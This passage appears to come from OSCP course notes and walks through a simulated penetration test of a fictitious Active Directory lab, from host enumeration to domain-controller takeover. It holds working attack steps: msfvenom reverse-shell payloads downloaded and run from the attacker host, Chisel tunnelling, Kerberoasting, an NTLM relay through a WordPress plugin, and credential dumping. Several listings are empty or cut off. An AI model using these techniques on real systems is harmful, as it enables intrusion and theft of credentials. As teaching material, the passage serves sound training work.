In the previous Learning Unit, we obtained an initial foothold on the CLIENTWK1 machine. Because we have no information about the local system or the internal network yet, we have to gather information on both. We'll first enumerate CLIENTWK1 and then the Active Directory environment. Our goal is to identify potential lateral movement vectors or ways to elevate our privileges.

## 27.4.1. Situational Awareness

In this section, we'll attempt to gain situational awareness on the CLIENTWK1 system and the internal network. First, we'll perform local enumeration on CLIENTWK1 to obtain an overview of the system and identify potentially valuable information and data. Then, we'll enumerate the domain to discover users, computers, domain administrators, and potential vectors for lateral movement and privilege escalation.

For this Learning Unit, we'll not explicitly store every result in our workspace directory on Kali. However, to get used to the documenting process you should create notes of all findings and information while following along.

Let's start with enumerating the CLIENTWK1 machine. Let's copy the 64-bit winPEAS executable to the directory served by the Python3 web server. On CLIENTWK1, we'll change the current directory to the home directory for *marcus* and download *winPEAS* from our Kali machine. Once downloaded, we'll launch it.

```
PS C:\Windows\System32\WindowsPowerShell\v1.0> cd C:\Users\marcus
cd C:\Users\marcus

PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe

PS C:\Users\marcus> .\winPEAS.exe
.\winPEAS.exe
...
```

> Listing 41 - Downloading and executing winPEAS

Let's review some of the results provided by winPEAS. We'll start with the *Basic System Information* section.

```
����������͹ Basic System Information

    Hostname: CLIENTWK1
    Domain Name: beyond.com
    ProductName: Windows 10 Pro
    EditionID: Professional
```

> Listing 42 - Basic System Information

Listing 42 shows that winPEAS detected CLIENTWK1's operating system as Windows 10 Pro. As we have learned in the course, winPEAS may falsely detect Windows 11 as Windows 10, so let's manually check the operating system with **systeminfo**.

```
PS C:\Users\marcus> systeminfo
systeminfo

Host Name:                 CLIENTWK1
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22000 N/A Build 22000
```

> Listing 43 - Operating System Information

Indeed, Windows 11 is the operating system on CLIENTWK1. If we had blindly relied on the winPEAS results, we may have made the wrong assumptions from the beginning.

With experience, a penetration tester will develop a sense for which information from automated tools should be double-checked.

Going back to review the winPEAS output, we come across the AV section.

```
����������͹ AV Information
  [X] Exception: Object reference not set to an instance of an object.
    No AV was detected!!
    Not Found
```

> Listing 44 - AV Information

No AV has been detected. This will make the use of other tools and payloads such as Meterpreter much easier.

Let's also review the network information such as *Network Ifaces and known hosts* and *DNS cached*.

```

```

> Listing 45 - Network Interfaces, Known hosts, and DNS Cache

Listing 45 shows that the DNS entries for **mailsrv1.beyond.com** (172.16.6.254) and **dcsrv1.beyond.com** (172.16.6.240) are cached on CLIENTWK1. Based on the name, we can assume that DCSRV1 is the domain controller of the **beyond.com** domain.

Furthermore, because MAILSRV1 is detected with the internal IP address of *172.16.6.254* and we enumerated the machine from an external perspective via *192.168.50.242*, we can safely assume that this is a dual-homed host.

As we did for credentials, let's create a text file named **computer.txt** in **/home/kali/beyond/** to document identified internal machines and additional information about them.

```
kali@kali:~/beyond$ cat computer.txt                                        
172.16.6.240 - DCSRV1.BEYOND.COM

172.16.6.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
```

> Listing 46 - List containing the most important information about identified target machines

Reviewing the rest of the winPEAS results, we don't find any actionable information to attempt a potential privilege escalation attack. However, we should remind ourselves that we are in a simulated penetration test and not in a CTF lab environment. Therefore, it is not necessary to get administrative privileges on every machine.

While we skipped over most of the winPEAS results, we should examine the results thoroughly as we would in a real penetration test. After the local enumeration of the system, we should have obtained key pieces of information, which we listed in the *Situational Awareness* section of the *Windows Privilege Escalation* Module.

Since we haven't identified a privilege escalation vector via winPEAS and there is nothing else actionable on the system, such as a Password Manager, let's start enumerating the AD environment and its objects.

We learned several techniques in this course to perform this kind of enumeration. For this Module, we'll use *BloodHound* with the *SharpHound.ps1* collector, which we discussed in the *Active Directory Introduction and Enumeration* Module.

First, we'll copy the PowerShell collector to **/home/kali/beyond** in a new terminal tab to serve it via the Python3 web server on port 8000.

```
kali@kali:~/beyond$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
```

> Listing 47 - Copying SharpHound collector to the beyond directory

Since our Python3 web server is still running on port 8000, we can download the PowerShell script on the target machine and import it in a newly spawned PowerShell session with the ExecutionPolicy set to **Bypass**.

```
PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1

> Listing 50 - Directory listing to identify the name of the SharpHound Zip archive

Let's transfer the file to our Kali machine then start *neo4j* and BloodHound. Once BloodHound is started, we'll upload the zip archive with the *Upload Data* function.

![[OffSec/OSCP/z. images/de10f0cc5d15c3c42daf6e6f1d415d1d_MD5.jpg]]

Figure 9: Upload Zip Archive to BloodHound

Once the upload is finished, we can start the enumeration of the AD environment with BloodHound.

Before we start, let's briefly review some of BloodHound's capabilities. As we have learned, BloodHound contains various pre-built queries such as *Find all Domain Admins*. These queries are built with the [*Cypher Query Language*](https://neo4j.com/developer/cypher/). In addition to the pre-built queries, BloodHound also allows us to enter custom queries via the *Raw Query* function at the bottom of the GUI.

Since we are currently interested in basic domain enumeration, such as listing AD users and computers, we must build and enter custom queries as the pre-built functions don't provide these capabilities.

Let's build a raw query to display all computers identified by the collector. The query starts with the keyword **MATCH**, which is used to select a set of objects. Then, we set the variable **m** containing all objects in the database with the property **Computer**. Next, we use the **RETURN** keyword to build the resulting graph based on the objects in m.

```
MATCH (m:Computer) RETURN m
```

> Listing 51 - Custom query to display all computers

Let's enter this query in the *Raw Query* section and build the graph.

![[OffSec/OSCP/z. images/803410c5028a26ccc295748c40f3cd80_MD5.jpg]]

Figure 10: Show all Computer objects in the BEYOND.COM domain

Figure 10 shows that there are four computer objects in the domain. By clicking on the nodes, we can obtain additional information about the computer objects, such as the operating system.

```
DCSRV1.BEYOND.COM - Windows Server 2022 Standard
INTERNALSRV1.BEYOND.COM - Windows Server 2022 Standard
MAILSRV1.BEYOND.COM - Windows Server 2022 Standard
CLIENTWK1.BEYOND.COM - Windows 11 Pro
```

> Listing 52 - Identified computer objects and their operating system

In addition to CLIENTWK1, on which we have an interactive shell, BloodHound has also identified the already known domain controller DCSRV1 and dual-homed mail server MAILSRV1. Furthermore, it discovered another machine named INTERNALSRV1.

Let's obtain the IP address for INTERNALSRV1 with **nslookup**.

```
PS C:\Users\marcus> nslookup INTERNALSRV1.BEYOND.COM
nslookup INTERNALSRV1.BEYOND.COM
Server:  UnKnown
Address:  172.16.6.240

Name:    INTERNALSRV1.BEYOND.COM
Address:  172.16.6.241
```

> Listing 53 - Looking up the IP address of INTERNALSRV1 via nslookup

Listing 53 shows that the IP address for INTERNALSRV1 is 172.16.6.241. Let's add this information to **computer.txt** on our Kali machine.

```
172.16.6.240 - DCSRV1.BEYOND.COM
-> Domain Controller

172.16.6.241 - INTERNALSRV1.BEYOND.COM

172.16.6.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.50.242)

172.16.6.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
```

> Listing 54 - Documenting results and information in computer.txt

Next, we want to display all user accounts on the domain. For this, we can replace the **Computer** property of the previous query with **User**.

![[OffSec/OSCP/z. images/1dbfc9032f31a61178018cc5e2abcff2_MD5.jpg]]

Figure 11: Show all User objects in the BEYOND.COM domain

Figure 11 shows that apart from the default AD user accounts, there are four other user account objects in the domain.

```
BECCY
JOHN
DANIELA
MARCUS
```

> Listing 55 - Discovered domain users

We already identified *john* and *marcus* as valid domain users in previous steps. However, we haven't established yet if *daniela* is also a domain user and not just a local user on WEBSRV1. In addition, we discovered a new user named *beccy*. Let's update **usernames.txt** accordingly.

To be able to use some of BloodHound's pre-built queries, we can mark *marcus* (interactive shell on CLIENTWK1) and *john* (valid credentials) as *Owned*. To do this, we'll right-click on the *MARCUS@BEYOND.COM* and *JOHN@BEYOND.COM* nodes and select *Mark User as Owned*.

Next, let's display all domain administrators by using the pre-built *Find all Domain Admins* query under the *Analysis* tab.

![[OffSec/OSCP/z. images/eeee3322c6ddecb28f2a30457ca1d443_MD5.jpg]]

Figure 12: Show all User objects in the BEYOND.COM domain

Figure 12 shows that apart from the default domain *Administrator* account, *beccy* is also a member of the *Domain Admins* group.

In a real penetration test, we should also examine domain groups and GPOs. Enumerating both is often a powerful method to elevate our privileges in the domain or gain access to other systems. For this simulated penetration test, we'll skip these two enumeration steps as they provide no additional value for this environment.

Next, let's use some of the pre-built queries to find potential vectors to elevate our privileges or gain access to other systems. We'll run the following pre-built queries:

- *Find Workstations where Domain Users can RDP*
- *Find Servers where Domain Users can RDP*
- *Find Computers where Domain Users are Local Admin*
- *Shortest Path to Domain Admins from Owned Principals*

Unfortunately, none of these queries return any results. This means BloodHound didn't identify any workstations or servers where *Domain Users* can log in via RDP.

In addition, no *Domain Users* are a local *Administrator* on any computer objects. Therefore, we don't have privileged access on any domain computers as *john* or *marcus*.

Finally, there are no direct paths from owned users to the *Domain Admins* group that BloodHound could identify.

These pre-built queries are often a quick and powerful way to identify low hanging fruit in our quest to elevate our privileges and gain access to other systems. Because BloodHound didn't provide us with actionable vectors, we must resort to other methods.

We could have also used PowerView or LDAP queries to obtain all of this information. However, in most penetration tests, we want to use BloodHound first as the output of the other methods can be quite overwhelming. It's an effective and powerful tool to gain a deeper understanding of the Active Directory environment in a short amount of time. We can also use raw or pre-built queries to identify highly complex attack vectors and display them in an interactive graphical view.

Before we further enumerate the domain in the next section, let's summarize the information we've obtained so far. We identified four computer objects and four user accounts and learned that *beccy* is a member of the *Domain Admins* group, making it a high value target. Furthermore, we ruled out some vectors that would have provided us access to other systems or privileged users.

## 27.4.2. Services and Sessions

In the previous section, we performed basic enumeration to obtain an understanding of the Active Directory environment.

In this section, we'll further enumerate the target network to identify potential attack vectors. First, we'll review all active user sessions on machines. Then, we'll examine user accounts for the existence of [*SPNs*](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names). Finally, we'll leverage tools such as Nmap and CrackMapExec via a [*SOCKS5*](https://en.wikipedia.org/wiki/SOCKS) proxy to identify accessible services.

To review active sessions, we'll again use a custom query in BloodHound. Since Cypher is a querying language, we can build a relationship query with the following syntax [**(NODES)-\[:RELATIONSHIP\]->(NODES)**](https://neo4j.com/developer/cypher/querying/).

The relationship for our use case is **\[:HasSession\]**. The first node of the relationship specified by a property is **(c:Computer)** and the second is **(m:User)**. Meaning, the edge between the two nodes has its source at the computer object. We'll use **p** to store and display the data.

```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

> Listing 56 - Custom query to display all active sessions

Now, let's enter the custom query in BloodHound:

![[OffSec/OSCP/z. images/9a04f4d7dd915e7255bde810f5edff15_MD5.jpg]]

Figure 13: Display all active sessions in the BEYOND.COM domain

Figure 13 shows that our query resulted in three active sessions. As expected, CLIENTWK1 has an active session with the user *marcus*.

Interestingly, the previously identified domain administrator account *beccy* has an active session on MAILSRV1. If we manage to get privileged access to this machine, we can potentially extract the NTLM hash for this user.

The user of the third active session is displayed as a SID. BloodHound uses this representation of a principal when the domain identifier of the SID is from a local machine. For this session, this means that the local *Administrator* (indicated by RID 500) has an active session on INTERNALSRV1.

Our next step is to identify all *kerberoastable* users in the domain. To do so, we can use the *List all Kerberoastable Accounts* pre-built query in BloodHound.

![[OffSec/OSCP/z. images/bf1c1b51d3ef04e3f80c341f788342aa_MD5.jpg]]

Figure 14: Display all kerberoastable user accounts in the BEYOND.COM domain

Figure 14 shows that apart from *krbtgt*, *daniela* is also kerberoastable.

The *krbtgt* user account acts as service account for the [*Key Distribution Center*](https://en.wikipedia.org/wiki/Key_distribution_center) (KDC) and is responsible for encrypting and signing Kerberos tickets. When a domain is set up, a password is randomly generated for this user account, making a password attack unfeasible. Therefore, we can often safely skip *krbtgt* in the context of Kerberoasting.

Let's examine the SPN for *daniela* in BloodHound via the *Node Info* menu by clicking on the node.

![[OffSec/OSCP/z. images/4a4280e25142299351ae4e49a00f4960_MD5.jpg]]

Figure 15: SPN of the user account daniela

Figure 15 shows the mapped SPN **http/internalsrv1.beyond.com**. Based on this, we can assume that a web server is running on INTERNALSRV1. Once we've performed Kerberoasting and potentially obtained the plaintext password for *daniela*, we may use it to access INTERNALSRV1.

However, as we have stated before, finding an actionable vector should not interrupt our enumeration process. We should collect all information, prioritize it, and then perform potential attacks.

Therefore, let's set up a SOCKS5 proxy to perform network enumeration via Nmap and CrackMapExec to identify accessible services, open ports, and SMB settings.

First, we'll create a staged Meterpreter TCP reverse shell as an executable file with **msfvenom**. Since we can reuse the binary throughout the domain, we can store it in **/home/kali/beyond**.

```
kali@kali:~/beyond$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: met.exe
```

> Listing 57 - Creating a Meterpreter reverse shell executable file

Now, let's start a *multi/handler* listener with the corresponding settings in Metasploit. In addition, we'll **set** the option **ExitOnSession** to **false**. It specifies that the listener stays active for new sessions without the need to restart it for every incoming session.

```
kali@kali:~/beyond$ sudo msfconsole -q

msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 192.168.119.5
LHOST => 192.168.119.5

msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443

msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false

msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started HTTPS reverse handler on https://192.168.119.5:443
```

> Listing 58 - Starting Metasploit listener on port 443

Next, we can download and execute **met.exe** on CLIENTWK1.

```
PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe

PS C:\Users\marcus> .\met.exe
```

> Listing 59 - Downloading and executing Meterpreter reverse shell

In Metasploit, a new session should appear:

```
[*] Meterpreter session 1 opened (192.168.119.5:443 -> 192.168.50.242:64234) at 2022-10-11 07:05:22 -0400
```

> Listing 60 - Incoming session in Metasploit

Once session 1 is opened, we can use **multi/manage/autoroute** and **auxiliary/server/socks\_proxy** to create a SOCKS5 proxy to access the internal network from our Kali box as we learned in the "The Metasploit Framework" Module.

```
msf6 exploit(multi/handler) > use multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set session 1
session => 1

msf6 post(multi/manage/autoroute) > run
[!] SESSION may not be compatible with this module:

msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1

msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5

msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 2.
```

> Listing 61 - Creating a SOCKS5 proxy to access the internal network from our Kali machine

The SOCKS5 proxy is now active, and we can use *proxychains* to access the internal network. Let's confirm that **/etc/proxychains4.conf** still contains the necessary settings from previous Modules. Meaning, only the SOCKS5 entry from the following listing should be active.

```
kali@kali:~/beyond$ cat /etc/proxychains4.conf
...
socks5  127.0.0.1 1080
```

> Listing 62 - proxychains configuration file settings

Finally, we are set up to enumerate the network via Proxychains.

Let's begin with CrackMapExec's SMB module to retrieve basic information of the identified servers (such as SMB settings). We'll also provide the credentials for *john* to list the SMB shares and their permissions with **\--shares**. Because CrackMapExec doesn't have an option to specify an output file, we'll copy the results manually and store them in a file.

```

> Listing 63 - Enumerating SMB with CrackMapExec and proxychains

Listing 63 shows that *john* doesn't have actionable or interesting permissions on any of the discovered shares. As we already established via a pre-built BloodHound query and now through the scan, *john* as a normal domain user doesn't have local Administrator privileges on any of the machines in the domain.

CrackMapExec version 5.4.0 may throw the error **The NETBIOS connection with the remote host is timed out** for DCSRV1 or doesn't provide any output at all. [Version 5.4.1](https://wiki.porchetta.industries/getting-started/installation/installation-on-unix) contains a fix to address this issue.

The output also states that MAILSRV1 and INTERNALSRV1 have *SMB signing* set to *False*. Without this security mechanism enabled, we can potentially perform relay attacks if we can force an authentication request.

Next, let's use Nmap to perform a port scan on ports commonly used by web applications and FTP servers targeting MAILSRV1, DCSRV1, and INTERNALSRV1. We must specify **\-sT** to perform a TCP connect scan. Otherwise, Nmap will not work over Proxychains.

```
kali@kali:~/beyond$ sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254

```

> Listing 64 - Using Nmap to perform a port scan on ports 21, 80, and 443

Listing 64 shows that Nmap identified the open ports 80 and 443 on 172.16.6.241 (INTERNALSRV1) and port 80 on 172.16.6.254 (MAILSRV1). For now, we can skip the latter one as it's most likely the same web page and service we enumerated from an external perspective.

While we could use the SOCKS5 proxy and proxychains to browse to the open port on 172.16.6.241, we'll use [*Chisel*](https://github.com/jpillora/chisel) as it provides a more stable and interactive browser session. From the [releases page](https://github.com/jpillora/chisel/releases/tag/v1.7.7), we download the Windows and Linux amd64 versions and extract the binaries in **/home/kali/beyond/**.

On our Kali machine, we'll use Chisel in server mode to receive incoming connections on port 8080. In addition, we'll add the **\--reverse** option to allow reverse port forwarding.

```
kali@kali:~/beyond$ chmod a+x chisel

kali@kali:~/beyond$ ./chisel server -p 8080 --reverse
2022/10/11 07:20:46 server: Reverse tunnelling enabled

```

> Listing 65 - Setting up Chisel on Kali to access the Web Server on INTERNALSRV1 via Browser

Then, we'll transfer the extracted **chisel.exe** binary to CLIENTWK1 by using Meterpreter's *upload* command.

```
msf6 auxiliary(server/socks_proxy) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > upload chisel.exe C:\\Users\\marcus\\chisel.exe

[*] Completed  : /home/kali/beyond/chisel.exe -> C:\Users\marcus\chisel.exe
```

> Listing 66 - Uploading Chisel to CLIENTWK1 via our Meterpreter session

Now, we can enter **shell** and utilize Chisel in client mode to connect back to our Kali machine on port 8080. We'll create a reverse port forward with the syntax **R:localport:remotehost:remoteport**. In our case, the remote host and port are 172.16.6.241 and 80. The local port we want to utilize is 80.

```
C:\Users\marcus> chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80
2022/10/11 07:22:46 client: Connecting to ws://192.168.119.5:8080

```

> Listing 67 - Utilizing Chisel to set up a reverse port forwarding to port 80 on INTERNALSRV1

Once Chisel connects, we can browse to port 80 on 172.16.6.241 via port 80 on our Kali machine (127.0.0.1) by using Firefox:

![[OffSec/OSCP/z. images/e99da10208ff2e27514a7413111b865e_MD5.jpg]]

Figure 16: WordPress page on INTERNALSRV1 (172.16.6.241)

Figure 16 shows us a WordPress instance (indicated by the URL and title of the page) on INTERNALSRV1. Let's browse to the dashboard login page for WordPress at **http://127.0.0.1/wordpress/wp-admin** and try to log into it with credentials we've discovered so far.

Once we have entered the URL, Firefox displays an error:

![[OffSec/OSCP/z. images/aeea1cac79d8710fe644709f1e9d34cb_MD5.jpg]]

Figure 17: Failed Redirect to the Administrator Login

The navigation bar in Firefox shows that we were redirected to **internalsrv1.beyond.com**. We can assume that the WordPress instance has the DNS name set as this address instead of the IP address. Because our machine doesn't have information about this DNS name, we cannot connect to the page.

To be able to fully use the web application, we'll add **internalsrv1.beyond.com** via **127.0.0.1** to **/etc/hosts**.

```
kali@kali:~/beyond$ cat /etc/hosts                         
127.0.0.1       localhost
127.0.1.1       kali
...
127.0.0.1    internalsrv1.beyond.com
...
```

> Listing 68 - Contents of /etc/hosts

Now, let's open the **/wp-admin** page again.

![[OffSec/OSCP/z. images/ea33690b6446ae33a56b0f37a1591d70_MD5.jpg]]

Figure 18: Administrator Login of Wordpress on INTERNALSRV1

Figure 18 shows that the login page is now displayed correctly.

Let's try to log in with the credentials we've obtained so far as well as common username and password pairs, such as **admin:admin**. Unfortunately, none of them work.

Let's summarize the information we've gathered in this section before we attempt our attacks. First, we enumerated all active sessions. Interestingly, the domain administrator *beccy* has an active session on MAILSRV1. Next, we identified *daniela* as a kerberoastable user due to the **http/internalsrv1.beyond.com** SPN.

Then, we set up a SOCKS5 proxy with Metasploit and used CrackMapExec and Nmap to perform network enumeration. The output revealed that MAILSRV1 and INTERNALSRV1 each have an accessible web server and SMB signing disabled. Via Chisel, we were able to browse to the WordPress instance on INTERNALSRV1. However, none of the credentials worked to log in to the WordPress login page.

## 27.5. Attacking an Internal Web Application

This Learning Unit covers the following Learning Objectives:

- Perform Kerberoasting
- Abuse a WordPress Plugin function for a Relay attack

In the previous Learning Unit, we obtained a huge amount of information and data regarding the client's domain network. In this Learning Unit, we'll combine various pieces of gathered information to create an attack vector.

## 27.5.1. Speak Kerberoast and Enter

Based on the information from the previous Learning Unit, the web application on INTERNALSRV1 is the most promising target now. Because it is a WordPress site, we could use WPScan again or use password attacks to successfully log in to WordPress's dashboard.

Every time we obtain new information, we should reevaluate what we already know. For our situation, this means that we already obtained the information that *daniela* has an http SPN mapped to INTERNALSRV1. Our assumption at this point is that *daniela* may be able to log in to the WordPress login page successfully.

Since *daniela* is kerberoastable, we can attempt to retrieve the user's password this way. If we can crack the [*TGS-REP*](https://en.wikipedia.org/wiki/Kerberos_\(protocol\)) password hash, we may be able to log in to WordPress and gain further access to INTERNALSRV1.

If this attack vector fails, we can use WPScan and other web application enumeration tools to identify potential vulnerabilities on INTERNALSRV1 or switch targets to MAILSRV1.

Let's perform Kerberoasting on Kali with *impacket-GetUserSPNs* over the SOCKS5 proxy using Proxychains. To obtain the TGS-REP hash for *daniela*, we must provide the credentials of a domain user. Because we only have one valid set of credentials, we'll use *john*.

```

```

> Listing 69 - Kerberoasting the daniela user account

Let's store the hash in **/home/kali/beyond/daniela.hash** and launch Hashcat to crack it.

```

```

> Listing 70 - Cracking the TGS-REP hash

Very nice! We successfully cracked the TGS-REP hash and obtained the plaintext password for *daniela*. Let's store the username and password in **creds.txt**.

We already established that no domain user has local *Administrator* privileges on any domain computers, and we cannot use RDP to log in to them. However, we may be able to use protocols such as WinRM to access other systems.

Next, let's try to log in to WordPress at **/wp-admin** via our forwarded port.

![[OffSec/OSCP/z. images/f3b8564f58a68e7d8db61248d3116bf2_MD5.jpg]]

Figure 19: Successful Login to WordPress as daniela

Great! We successfully logged in to the WordPress instance as *daniela*. In the next section, we'll leverage this access to gain access to another system.

## 27.5.2. Abuse a WordPress Plugin for a Relay Attack

In the previous section, we retrieved the plaintext password for *daniela* and gained access to the WordPress dashboard on INTERNALSRV1. Let's review some of the settings and plugins.

We'll begin with the configured users:

![[OffSec/OSCP/z. images/15305d0f5f4f13348b8270ff7e32cd97_MD5.jpg]]

Figure 20: Daniela is the only WordPress user

Figure 20 shows *daniela* is the only user. Next, let's check *Settings* > *General*.

![[OffSec/OSCP/z. images/88fe573ac585a9159be1074d22ecf798_MD5.jpg]]

Figure 21: General WordPress settings

The *WordPress Address (URL)* and *Site Address (URL)* are DNS names as we assumed. All other settings in *Settings* are mostly default values. Let's review the installed plugins next.

![[OffSec/OSCP/z. images/f27c46be1f3f04d1758f16612ff2a043_MD5.jpg]]

Figure 22: Installed WordPress Plugins

Figure 22 shows three plugins, but only [*Backup Migration*](https://wordpress.org/plugins/backup-backup/) is enabled. Let's click on *Manage*, which brings us to the plugin configuration page. Clicking through the menus and settings, we discover the *Backup directory path*.

![[OffSec/OSCP/z. images/53f0c798ae49e6ea3822abad5471a5b7_MD5.jpg]]

Figure 23: Backup Migration plugin settings

Figure 23 shows that we can enter a path in this field, which will be used for storing the backup. We may abuse this functionality to force an authentication of the underlying system.

Let's pause here for a moment and plan our next steps. Now, there are two promising attack vectors.

The first is to upload a malicious WordPress plugin to INTERNALSRV1. By preparing and uploading a web shell or reverse shell, we may be able to obtain code execution on the underlying system.

For the second attack vector, we must review the BloodHound results again and make some assumptions. As we have discovered, the local *Administrator* account has an active session on INTERNALSRV1. Based on this session, we can assume that this user account is used to run the WordPress instance.

Furthermore, it's not uncommon that the local *Administrator* accounts across computers in a domain are set up with the same password. Let's assume this is true for the target environment.

We also learned that the domain administrator *beccy* has an active session on MAILSRV1 and therefore, the credentials of the user may be cached on the system.

Due to SMB signing being disabled on MAILSRV1 and INTERNALSRV1, a relay attack is possible if we can force an authentication.

Finally, we identified the *Backup directory path* field in the WordPress *Backup Migration* plugin containing the path for the backup destination. This may allow us to force such an authentication request.

Based on this information, let's define a plan for the second attack vector. First, we'll attempt to force an authentication request by abusing the *Backup directory path* of the Backup Migration WordPress plugin on INTERNALSRV1. By setting the destination path to our Kali machine, we can use [*impacket-ntlmrelayx*](https://www.kali.org/tools/impacket-scripts/) to relay the incoming connection to MAILSRV1. If our assumptions are correct, the authentication request is made in the context of the local *Administrator* account on INTERNALSRV1, which has the same password as the local *Administrator* account on MAILSRV1.

If this attack is successful, we'll obtain privileged code execution on MAILSRV1, which we can then leverage to extract the NTLM hash for *beccy* and therefore, meet one of the primary goals of the penetration test.

Since the second attack vector not only results in code execution on a single system, but also provides a potential vector to achieve one of the goals of the penetration test, we'll perform the relay attack first.

Let's set up **impacket-ntlmrelayx** before we modify the *Backup directory path* in the WordPress plugin. We'll use **\--no-http-server** and **\-smb2support** to disable the HTTP server and enable SMB2 support. We'll specify the external address for MAILSRV1, 192.168.50.242, as target for the relay attack. By entering the external address, we don't have to proxy our relay attack via Proxychains. Finally, we'll base64-encode a [*PowerShell reverse shell oneliner*](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3) that will connect back to our Kali machine on port 9999 and provide it as a command to **\-c**.

```

> Listing 71 - Setting up impacket-ntlmrelayx

Next, we'll set up a Netcat listener on port 9999 for the incoming reverse shell.

```
kali@kali:~/beyond$ nc -nvlp 9999
listening on [any] 9999 ...
```

> Listing 72 - Setting up Netcat listener on port 9999

Now with everything set up, we can modify the *Backup directory path*.

Let's set the path to the [*URI reference*](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#URI_references) **//192.168.119.5/test** in which the IP is the address of our Kali machine and **test** is a nonexistent path.

![[OffSec/OSCP/z. images/4507698fbfe1c339cfb9717c1139aec1_MD5.jpg]]

Figure 24: Modified Backup directory path

Once entered, we can scroll down and click on *Save*. This should cause the WordPress plugin to authenticate to impacket-ntlmrelayx in the context of the user running WordPress.

```
...

```

> Listing 73 - Executing reverse shell on MAILSRV1 via impacket-ntlmrelayx

Listing 73 confirms the assumptions we made earlier. First, *INTERNALSRV1/ADMINISTRATOR* was used to perform the authentication. Second, by successfully authenticating to MAILSRV1, we confirmed that both machines use the same password for the local *Administrator* account.

The output also states that the relayed command on MAILSRV1 got executed. Let's check our Netcat listener for an incoming reverse shell.

```
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 50063
whoami
nt authority\system

PS C:\Windows\system32> hostname
MAILSRV1

PS C:\Windows\system32>
```

> Listing 74 - Incoming reverse shell

Great! We successfully obtained code execution as *NT AUTHORITY\\SYSTEM* by authenticating as a local *Administrator* on MAILSRV1 by relaying an authentication attempt from the WordPress plugin on INTERNALSRV1.

In the next Learning Unit, we'll leverage the interactive shell on MAILSRV1 to obtain privileged access to the domain and its domain controller.

## 27.6. Gaining Access to the Domain Controller

This Learning Unit covers the following Learning Objectives:

- Gather information to prepare client-side attacks
- Leverage client fingerprinting to obtain information

In the previous Learning Unit, we gained access to MAILSRV1 as *NT AUTHORITY\\SYSTEM*. Based on the information from enumerating the network, we'll attempt to obtain domain *Administrator* privileges in this Learning Unit and use them to access the domain controller.

## 27.6.1. Cached Credentials

As planned, we obtained privileged code execution on MAILSRV1. Our next step is to extract the password hash for the user *beccy*, which has an active session on this system.

Depending on the objective of the penetration test, we should not skip the local enumeration of the MAILSRV1 system. This could reveal additional vulnerabilities and sensitive information, which we may miss if we directly attempt to extract the NTLM hash for *beccy*.

Once we discover that no AV is running, we should upgrade our shell to Meterpreter. This will not only provide us with a more robust shell environment, but also aid in performing post-exploitation.

Let's download the previously created Meterpreter reverse shell payload **met.exe** to perform post-exploitation.

```
PS C:\Windows\system32> cd C:\Users\Administrator

PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe

PS C:\Users\Administrator> .\met.exe
```

> Listing 75 - Downloading and executing the Meterpreter reverse shell

In Metasploit, we should receive a new incoming session.

```
[*] Sending stage (200774 bytes) to 192.168.50.242

```

> Listing 76 - Incoming Meterpreter session in Metasploit

> Listing 79 - Extracting the credentials for beccy with Mimikatz

Great! We successfully extracted the clear text password and NTLM hash of the domain administrator *beccy*. Let's store both together with the username in **creds.txt** on our Kali system.

Armed with these credentials, we can now take the last step of the penetration test: accessing the domain controller. We'll do this in the next section.

## 27.6.2. Lateral Movement

In this section, we'll leverage the domain admin privileges for *beccy* to get access to the domain controller and therefore, achieve the second goal of the penetration test.

Because we've obtained the clear text password and NTLM hash for *beccy*, we can use **impacket-psexec** to get an interactive shell on DCSRV1. While we could use either of them, let's use the NTLM hash. Once we have a command line shell, we confirm that we have privileged access on DCSRV1 (172.16.6.240).

Nice! Listing 80 shows that we achieved all goals of the penetration test by obtaining domain administrator privileges and accessing the domain controller.

#### Labs

1. In a real assessment, we'd now create a penetration testing report for our client to inform them about our findings. Attached is an example report for the penetration test of *BEYOND Finances*. Read the report, find the flag at the end of the document, and enter it as answer to this exercise.

Answer

## 27.7. Wrapping Up

In this Module, we performed a penetration test for the fictitious client BEYOND Finances. The goals set by the client were to gain access to the internal network, obtain domain *Administrator* privileges, and access the domain controller.

Once we managed to get an initial foothold in the internal network, we performed Kerberoasting to obtain the credentials of a domain user. With this account, we could log in to a WordPress instance and abuse a plugin to authenticate to our Kali machine. We then relayed the authentication request to another machine and obtained code execution as *NT AUTHORITY\\SYSTEM*. Armed with administrative privileges, we extracted the credentials of a domain Admin account. Then, we successfully accessed the domain controller.

